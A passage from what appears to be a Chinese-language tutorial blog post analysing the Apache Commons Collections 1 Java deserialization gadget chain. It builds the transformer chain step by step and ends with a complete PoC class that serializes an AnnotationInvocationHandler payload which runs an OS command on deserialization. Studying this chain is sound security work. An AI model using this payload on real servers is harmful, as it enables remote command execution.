class="line">        );</span><br><span class="line">        <span class="comment">//得到Runtime.getRuntime()实例input</span></span><br><span class="line">        Object input = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为了能触发exec.invoke(input,"cmd"),需要执行transform方法</span></span><br><span class="line">        it.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题来了，不会有人可以写好一个input在代码中等你，所以input需要写进payload。</p><p>所以接下来我们要去找：<strong>哪些类可以把input塞进去</strong>？</p><p>由于这里input依赖了反射，所以我们最好在jar包里找到一个invoke的复写点，直接全局搜invoke，发现只有InvokerTransformer自己。</p><p>所以这里<strong>我们需要将input拆开，为了依赖不同的组件</strong>。</p><p>想法就是既然你ChainedTransformer的transform可以<strong>循环调用</strong>Transformer数组内的不同tranform方法，那么我们也去找若干个Transformer来将input分别承担。</p><p>首先我们感觉肯定是越简单越好，最好是直接出现一个Transformer可以直接返回一个Runtime.getRuntime()</p><p>这样第二步直接new InvokerTransformer()就可以了：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().invoke(method(exec),<span class="string">"open /Applications/Calculator.app"</span>)</span><br></pre></td></tr></table></figure><p>寻找Transformer的实现类14个：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512150641804.png" alt="image-20210512150641804" style="zoom:80%;"><p>我们只想要一个Transformer帮我们承担Runtime.getRuntime()即可，其他最好什么都不做。</p><p>发现ConstantTransformer最合适：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512150729223.png" alt="image-20210512150729223" style="zoom:80%;"><p>完全都是简单的传递。</p><p>所以这时候demo2.0出现了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">                <span class="comment">// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);<span class="comment">//触发ChainedTransformer里面每一个人的transform</span></span><br></pre></td></tr></table></figure><p>但是这版本仅仅在本地可以测试，因为Runtime类没有实现Serializable接口，所以无法传输。</p><p>所以我们就需要反序列化那一端机器的Runtime实例。</p><p>继续拆分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>)，//先得到<span class="title">Class</span>对象，<span class="title">Class</span>支持<span class="title">Serializable</span></span></span><br><span class="line">                new ConstantTransformer("getRuntime",new Class[]&#123;&#125;,new Object[]&#123;&#125;),//得到getRuntime方法对象</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)//将这个方法对象套在exec上</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>讲道理这样是可以的，但是实际上还是不行：</p><p>因为在InvokerTransformer的tranform中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512153300247.png" alt="image-20210512153300247"></p><p>上来先input.getClass了，别忘了我们给的东西是Runtime.class，那结果肯定是Class对象java.lang.Class。</p><p>在java.lang.Class中寻找getRuntime对象肯定是找不到的。</p><p>所以这时候需要换一个思路：<strong>先拿到梯子，这里面的梯子就是getMethod方法</strong></p><p>目标语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标语句</span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>步走</span><br><span class="line"><span class="number">1</span>.先获得getMethod的方法对象，这个方法在java.lang.Class中</span><br><span class="line">Method gm = Class.forName("java.lang.Class").getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;)</span><br><span class="line"><span class="number">2</span>.拿到之后，需要把getRuntime函数取出来。因为getMethod方法的作用就是返回一个method对象，所以直接invoke就行</span><br><span class="line">Method gr = gm.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[]&#123;&#125;);</span><br><span class="line"><span class="number">3</span>.准备用gm去把invoke引出来</span><br><span class="line">Method i = gm.invoke(Class.forName(<span class="string">"java.lang.reflect.Method"</span>),<span class="string">"invoke"</span>)</span><br><span class="line"><span class="number">4</span>.组合到一起</span><br><span class="line">i.invoke("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br></pre></td></tr></table></figure><p>晕的可以往下看：</p><p>失败版构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想拿到getRuntime方法，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个Method方法</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>InvokerTransformer的参数包括(方法名a，a的参数类型，invoke的参数{对象，对象参数})</p><p>我们认为可以，但实际上还是不行，原因：</p><p>在第二步出来之后，object是getRuntime，是method对象，<strong>一个Method对象是不能调用exec()的</strong></p><p>所以我们这里还需要<strong>invoke</strong>函数的参与</p><p>所以我们还需要再来一步得到invoke函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想先反射出来getRuntime参数，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个方法。</span></span><br><span class="line">  new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)</span><br><span class="line">          <span class="comment">//把invoke方法引出来，看好参数的类别，该占位占位</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里重点记录一下invoke环节的debug过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个Method对象</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是Method类）</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure><p>最后一步其实就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(getRuntime(),<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;);</span><br></pre></td></tr></table></figure><p>发现一个骚东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(a,&#123;b,c&#125;)</span><br><span class="line">  a.invoke(b,c)</span><br><span class="line">  b.a(c)</span><br></pre></td></tr></table></figure><p>套用在最后一句上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke.invoke(getRuntime(),<span class="keyword">null</span>);</span><br><span class="line">getRuntime().invoke(<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>这里为什么null可以呢？</p><p>是因为getRuntime函数是static的，根本不需要obj来hold。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513015209016.png" alt="image-20210513015209016" style="zoom:50%;"><p>所以这里这两种写法<strong>都可以</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)</span><br><span class="line">new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;Class.forName("java.lang.Runtime"),new Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>多说一句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getRuntime().invoke(<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>这句话相当于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getRuntime() 后面都是寂寞</span><br><span class="line">getRuntime() =&gt; Runtime 实例</span><br></pre></td></tr></table></figure><p>既然能返回Runtime实例，目标达成。</p><p>第四步debug：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=Runtime类实例</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Runtime </span></span><br><span class="line">Method method = cls.getMethod(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//在Runtime类中找到exec方法，method=exec方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="string">"open /Applications/Calculator.app"</span>); <span class="comment">//调用invoke方法</span></span><br></pre></td></tr></table></figure><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512161134367.png" alt="image-20210512161134367" style="zoom:80%;"><p>所以目前demo3.0:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChainedTransformer</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//触发</span></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们最想要的是，transform方法最好也要自动触发，所以发现了checkSetValue方法，它会自动调用transform方法。</p><p>checkSetValue方法属于每一个继承了AbstractInputCheckedMapDecorator的类，TransformedMap算一个。</p><p>所以接下来我们的目标就变成了<strong>如何让TransformedMap自动调用transform方法</strong>。</p><p><strong>我们的ChainedTransformer说到底就是一个Transformer，只要添加数据至map中就会自动调用tramsform，就会执行转换链执行payload。</strong></p><p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。<strong>很明显后者是一个常规操作，极有可能被触发。</strong></p><p>举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure><p>可以看到三个参数，map，keyTransformer，valueTransformer。</p><p>查看org.apache.commons.collections.map.TransformedMap#decorate源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512170116032.png" alt="image-20210512170116032"></p><p>到这里，触发条件就是更改map的值(key或者value)即可。</p><h4 id="寻找readObject复写点"><a href="#寻找readObject复写点" class="headerlink" title="寻找readObject复写点"></a>寻找readObject复写点</h4><p>感觉还是奇怪，需要服务端配合将反序列化内容反序列化为map，并对值进行修改。</p><p>如果某个可序列化的类重写了<code>readObject()</code>方法，并且在<code>readObject()</code>中对Map类型的变量进行了key-value修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p><p>在1.7中存在一个完美的复写点：<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong></p><p>关于AnnotationInvocationHandler类，这个类本身是被设计用来处理Java注解的。</p><p>看两处源码关键点：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512171701564.png" alt="image-20210512171701564"></p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512172608629.png" alt="image-20210512172608629" style="zoom:95%;"><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p><strong>为什么要传入Target.class?</strong></p><p>Target是Java提供的四个元注解之一(Target，Documented，Inherited)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type)</span><br></pre></td></tr></table></figure><p>我们回来看<code>AnnotationType.getInstance(this.type)</code>对@Target这个注解的处理。var2=getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var3 = var2.memberTypes();</span><br></pre></td></tr></table></figure><p>var3就是var2的键值对类型，可以取值<code>Ljava.lang.annotation.ElementType</code>类型的值。</p><p>这里其实占了Java注解的语法糖的便宜，Java注解默认都是value = XXXX，相当于蹭了个谐音梗。</p><p><strong>为什么一定要Map(“value”, “value”)?</strong></p><p>因为在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();<span class="comment">//var3 = &#123;value：ElementType&#125;</span></span><br></pre></td></tr></table></figure><p>这就保证了在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();<span class="comment">// var3 = &#123;value：ElementType&#125;</span></span><br><span class="line">Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); <span class="comment">// var4 是迭代器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  Entry var5 = (Entry)var4.next();<span class="comment">//var5 = &#123;value:value&#125;</span></span><br><span class="line">  String var6 = (String)var5.getKey();<span class="comment">// var6 = value</span></span><br><span class="line">  Class var7 = (Class)var3.get(var6); <span class="comment">//ElementType</span></span><br><span class="line">  <span class="comment">//从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值</span></span><br><span class="line">  <span class="comment">//如果key的值不是value，那么这里就null，链就断掉了</span></span><br><span class="line">  <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">//触发命令执行处</span></span><br><span class="line">    var5.setValue...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>保证<code>innerMap.put(&quot;value&quot;,&quot;xxxxxx&quot;)</code>也是可以的，只要key的值为”value“就行。</strong></p><h4 id="最终版本PoC"><a href="#最终版本PoC" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><p>最终版本PoC构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_TransformedMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChian</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>挖掘流程：</p><ol><li>找readObejct复写点，发现了TransformedMap实现了，进去看一看，留个心</li><li>阅读文档，发现TransformedMap机制是一旦该Map中的元素发生了变化，都会调用Transformer的transform方法</li><li>发现Transformer的transform就是个接口中的方法</li><li>依次查看Transformer的实现类，发现ChainedTransformer中的transform会成环调用自身Transformer数组中的Transformer</li><li>[支线任务开启]寻找invoke调用2点，发现InvokerTransformer内部的transform方法符合反射调用，有可控潜力</li><li>为了符合exp的构造条件，发现ConstantTransformer可以参与</li><li>将一句话分别由多个Transformer来hold，形成了ChainedTransformer，为了让ChainedTransformer.transform可以自动化调用，下一步需要去找哪里用了transform方法</li><li>查看transform的调用，发现TransformedMap类中有checkSetValue方法调用了transform方法</li><li>同时发现checkSetValue是抽象类AbstractInputCheckedMapDecorator的方法，同时该类内部静态类MapEntry的setValue方法调用了checkSetValue方法</li><li>实现AbstractInputCheckedMapDecorator的类有四个，TransformedMap算一个。所以TransformedMap1既是readObject复写点，又是执行链的起点(更改map中的值)[支线任务结束]</li><li>如何来自动更改值，还是去找readObejct复写点，发现AnnotationInvocationHandler十分合适，既复写了readObject，又修改了map的值，可以包装到最外面</li><li>编写Exp</li></ol><p><strong>Exp利用流程</strong>：</p><ol><li>AnnotationInvocationHandler#readObject函数会在反序列化中被执行，并且会触发TransformedMap$EntrySet的setValue赋值。</li><li>EntrySet的构造函数是Set和AbstractInputCheckedMapDecorator类型。</li><li>由于TransformedMap继承了AbstractInputCheckedMapDecorator类，也就继承了AbstractInputCheckedMapDecorator内部的setValue方法。</li><li>setValue就是AbstractInputCheckedMapDecorator.MapEntry#setValue，他的内部会调用checkSetValue方法。</li><li>这里面的map是TransformedMap，所以TransformedMap版本的checkSetValue会调用transform方法，这个transform会调用TransformedMap自身的ConstantTransformer数组，循环调用。这个ConstantTransformer是通过decorate函数将ConstantTransformer配置进去的，最终payload执行。</li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513192345876.png" alt="image-20210513192345876"></p><p>这里值得细细地跟一下，TransformedMap并不是Map</p><p>this.memberValues = [TransformedMap outMap] = (&lt;”value”,”value”&gt;，chain)</p><p>TransformedMap自己没有entrySet，所以会执行距离它最近的父类的entrySet方法。</p><p>也就是AbstractInputCheckedMapDecorator的entrySet方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513202149561.png" alt="image-20210513202149561"></p><p>这里map的值为HashMap&lt;”value”,”value”&gt;，this是本类对象 TransformedMap outMap</p><p>调用的是本类内部类EntrySet的构造函数</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513203152290.png" alt="image-20210513203152290"></p><p>所以这个Entry函数ruturn回去就是一个AbstractInputCheckedMapDecorator$EntrySet的对象，结构是(注意他们的类别)：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205357509.png" alt="image-20210513205357509"></p><p>&lt;&lt;”value”,”value”&gt;,outMap&gt;就是var5</p><p>接下来会执行iterator方法，这个方法AbstractInputCheckedMapDecorator#EntrySet也做了实现：</p><p><img 